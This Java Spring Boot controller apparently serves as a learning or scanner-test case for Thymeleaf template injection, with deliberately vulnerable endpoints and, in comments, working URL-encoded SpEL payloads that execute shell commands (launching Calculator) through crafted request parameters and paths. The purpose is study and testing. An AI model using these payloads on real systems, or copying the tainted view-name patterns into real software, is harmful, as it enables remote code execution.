package com.xjjlearning.hack.springboot;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.thymeleaf.spring5.util.SpringRequestUtils;
import org.thymeleaf.spring5.view.ThymeleafView;
import org.thymeleaf.spring5.view.ThymeleafViewResolver;
import org.thymeleaf.standard.expression.StandardExpressionParser;
//import org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator;
//import org.thymeleaf.spring5.util.SpringRequestUtils;
//import org.thymeleaf.spring5.view.ThymeleafViewResolver;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Scanner;

@Controller
public class HelloController {

    Logger log = LoggerFactory.getLogger(HelloController.class);

    @GetMapping("/")
    public String index(Model model) {
//        ThymeleafViewResolver
//        org.springframework.web.servlet.mvc
//        SPELVariableExpressionEvaluator
//        SpringRequestUtils
//        ThymeleafView
//        StandardExpressionParser
//        SpringRequestUtils
        model.addAttribute("message", "happy birthday");
        return "welcome";
    }

    //GET /path?lang=en HTTP/1.1
    //GET /path?lang=__$%7bnew%20java.util.Scanner(T%20(java.lang.Runtime).getRuntime().exec(%22open -a Calculator.app%22).getInputStream()).next()%7d__::.x
    //GET /path?lang=__$%7bT%20(java.lang.Runtime).getRuntime().exec(%22open -a Calculator.app%22)%7d__::.x
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
//        org.thymeleaf.standard.expression.StandardExpressionPreprocessor
        return "user/" + lang + "/welcome"; //template path is tainted
    }

    //GET /fragment?section=main
    //GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a Calculator.app%22).getInputStream()).next()%7d__::.x
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }

    // GET /doc/welcome
    // GET /doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator.app%22).getInputStream()).next()%7d__::.x
    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }

    @GetMapping("/safe/fragment")
    @ResponseBody
    public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
    }

    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //FP as redirects are not resolved as expressions
    }

    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }

    public static void main(String[] args) throws IOException {
        new Scanner(Runtime.getRuntime().exec("open -a Calculator.app").getInputStream()).next();
    }
}